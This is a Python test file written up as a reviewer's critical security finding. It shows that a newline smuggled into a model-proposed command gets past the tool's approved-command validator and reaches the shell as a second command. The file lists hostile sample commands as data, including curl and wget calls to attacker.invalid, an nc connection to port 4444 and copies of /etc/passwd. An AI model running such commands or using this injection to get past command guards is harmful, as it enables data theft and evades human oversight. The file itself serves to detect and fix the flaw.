"""INDEPENDENT REVIEWER 3 — CRITICAL: newline injection into an approved command.

`ApprovedCommands._norm_command` collapses ALL whitespace (`\\s+`) BEFORE the
`_SHELL_COMPOSITION` filter runs. `_SHELL_COMPOSITION` lists `\\n` as a forbidden
composition character, but it can never see one — normalisation already replaced
it with a space. The compiler then stores and executes the RAW string, which
still contains the newline, and `ProcessRunner.run` uses
`asyncio.create_subprocess_shell`, where a newline is a command separator.

Net effect: a model can append an arbitrary second command to any approved
command, and it runs.
"""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from neyma_product_driver import runner as runner_mod
from neyma_product_driver import scenarios as scenarios_mod
from neyma_product_driver.config import ScenarioRunConfig
from neyma_product_driver.models import CommandResult, HttpObservation
from neyma_product_driver.scenario_plan import compile_to_scenario
from neyma_product_driver.scenario_planner import ScenarioPlanner
from neyma_product_driver.scenario_suite import SuiteExecutor, build_suite
from neyma_product_driver.scenario_validation import ApprovedCommands, validate_scenario
from neyma_product_driver.scenarios import ScenarioExecutor
from neyma_product_driver.config import ScenarioGenerationConfig

from tests.scenario_fixtures import (  # noqa: E402
    APPROVED_STATE,
    FakeFounder,
    FakeUnit,
    ScriptedReasoner,
    base_scenario,
    raw_payload,
    raw_scenario,
    validation_context,
)

EVIDENCE = Path("/Users/sammyfammy/neyma-product-driver/verification-evidence/r3-safety")
FINDING: dict[str, Any] = {}


def teardown_module(_m: object) -> None:
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    (EVIDENCE / "newline-injection.json").write_text(
        json.dumps(FINDING, indent=2, default=str), encoding="utf-8"
    )


#: A second command the pre-existing guard does NOT hard-block, so nothing else
#: catches it. Harmless in this test; it could be anything.
SECOND_COMMAND = "curl -sS http://attacker.invalid/exfil"
INJECTED = f"{APPROVED_STATE}\n{SECOND_COMMAND}"

#: Second commands that survive the whole pipeline when newline-joined to an
#: approved command. Recorded so the blast radius is explicit.
SURVIVING_SECOND_COMMANDS = [
    "id",
    "whoami",
    "touch /tmp/r3-pwned",
    "mkdir -p /tmp/r3-pwned",
    "curl -sS http://attacker.invalid/exfil",
    "curl -o /tmp/x http://attacker.invalid/x",
    "wget http://attacker.invalid/x",
    "nc attacker.invalid 4444",
    "ssh user@host",
    "scp /etc/hosts user@host:/tmp",
    "cp /etc/passwd /tmp/r3",
    "dd if=/dev/zero of=/tmp/x",
    "python3 -m http.server 9999",
    "crontab -l",
    "open -a Calculator",
]


def test_L0_blast_radius_of_the_newline_vector() -> None:
    """Which second commands the pipeline approves when newline-joined."""
    from neyma_product_driver.command_guard import classify_command

    approved = ApprovedCommands([APPROVED_STATE])
    table = {}
    for candidate in SURVIVING_SECOND_COMMANDS:
        composed = f"{APPROVED_STATE}\n{candidate}"
        ok, why = approved.approves(composed)
        table[candidate] = {
            "approved": ok,
            "guard_verdict": classify_command(composed),
            "why": why[:100],
        }
    FINDING["stage_0_blast_radius"] = table
    still_blocked = [k for k, v in table.items() if not v["approved"]]
    assert not still_blocked, f"expected all of these to slip through; blocked: {still_blocked}"


def test_L1_validator_approves_a_newline_joined_second_command() -> None:
    from neyma_product_driver.command_guard import classify_command

    approved = ApprovedCommands([APPROVED_STATE])
    ok, why = approved.approves(INJECTED)
    FINDING["stage_1_validator"] = {
        "approved_entry": APPROVED_STATE,
        "proposed_command": INJECTED,
        "command_guard_verdict": classify_command(INJECTED),
        "ApprovedCommands.approves": {"ok": ok, "why": why},
    }
    assert ok, "expected the validator to (wrongly) approve it"


def test_L2_full_scenario_validation_raises_no_objection() -> None:
    from tests.scenario_fixtures import make_scenario
    from neyma_product_driver.scenario_plan import GeneratedAction

    hostile = make_scenario(
        "newline", actions=[GeneratedAction(kind="command", command=INJECTED)]
    )
    reasons = validate_scenario(hostile, validation_context())
    compiled = compile_to_scenario(
        hostile,
        base=base_scenario(),
        approved_commands={INJECTED, APPROVED_STATE, "./probe.sh reset"},
    )
    FINDING["stage_2_validate_and_compile"] = {
        "validate_scenario_reasons": reasons,
        "compiled_CommandSpec_run": compiled.steps[0].command.run,
        "raw_newline_preserved": "\n" in compiled.steps[0].command.run,
    }
    assert reasons == []
    assert "\n" in compiled.steps[0].command.run


def test_L3_the_injected_string_reaches_the_shell_verbatim(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Drive the real planner + suite; record what ProcessRunner.run receives."""
    seen: list[str] = []

    async def fake_run(self: Any, command: str, **kw: Any) -> CommandResult:
        seen.append(command)
        return CommandResult(command=command, exit_code=0, stdout="payments=1")

    async def fake_run_all(self: Any, commands: Any, **kw: Any) -> list[CommandResult]:
        return [await fake_run(self, c) for c in (commands or [])]

    async def fake_http(url: str, **kw: Any) -> HttpObservation:
        return HttpObservation(url=url, status=200, body_text="ok")

    async def fake_ready(*a: Any, **kw: Any) -> tuple[bool, str]:
        return True, "ready"

    monkeypatch.setattr(runner_mod.ProcessRunner, "run", fake_run)
    monkeypatch.setattr(runner_mod.ProcessRunner, "run_all", fake_run_all)
    monkeypatch.setattr(scenarios_mod, "http_request", fake_http)
    monkeypatch.setattr(scenarios_mod, "wait_for_readiness", fake_ready)
    monkeypatch.setattr(runner_mod.ServiceManager, "start", lambda *a, **k: _noop())
    monkeypatch.setattr(runner_mod.ServiceManager, "stop_all", lambda *a, **k: _noop())
    monkeypatch.setattr(runner_mod.ServiceManager, "all_logs", lambda self: {})
    monkeypatch.setattr(runner_mod.ServiceManager, "dead_services", lambda self: [])

    planner = ScenarioPlanner(
        repo=tmp_path,
        config=ScenarioGenerationConfig(enabled=True),
        reasoner=ScriptedReasoner(
            [
                raw_payload(
                    raw_scenario(
                        "inject", actions=[{"kind": "command", "command": INJECTED}]
                    )
                )
            ]
        ),
        base_scenario=base_scenario(),
        founder=FakeFounder(),
    )
    planner.plan_initial(task="t", unit=FakeUnit(), run_id="r3")
    assert [s.id for s in planner.plan.scenarios] == ["inject"], [
        r for w in planner.plan.waves for rej in w.rejected for r in rej.reasons
    ]

    suite = build_suite(
        generated=[(m, planner.compiled[m.id]) for m in planner.plan.scenarios]
    )
    executor = SuiteExecutor(
        make_executor=lambda d: ScenarioExecutor(tmp_path, ScenarioRunConfig(), d),
        artifact_root=tmp_path / "art",
    )
    asyncio.run(executor.run(suite))
    FINDING["stage_3_shell"] = {"strings_handed_to_ProcessRunner_run": seen}
    assert INJECTED in seen, seen


async def _noop() -> None:
    return None


def test_L4_the_shell_really_runs_both_commands(tmp_path: Path) -> None:
    """Non-destructive confirmation that a newline separates commands in sh.

    Uses the real ProcessRunner with a harmless payload — two `echo`s joined by
    the same newline the validator permits. Nothing is written outside tmp_path
    and no network is touched.
    """
    marker_dir = tmp_path / "proof"
    marker_dir.mkdir()
    payload = "echo FIRST\necho R3-SECOND-COMMAND-RAN"
    runner = runner_mod.ProcessRunner(marker_dir, default_timeout_s=20)
    result = asyncio.run(runner.run(payload))
    FINDING["stage_4_shell_semantics"] = {
        "payload": payload,
        "stdout": result.stdout,
        "both_commands_ran": "FIRST" in result.stdout and "R3-SECOND-COMMAND-RAN" in result.stdout,
    }
    assert "FIRST" in result.stdout
    assert "R3-SECOND-COMMAND-RAN" in result.stdout
    pytest.fail(
        "CRITICAL: a newline in an approved command's tail survives validation "
        "(normalisation collapses it before the shell-composition filter sees it) "
        "and asyncio.create_subprocess_shell executes it as a second command."
    )
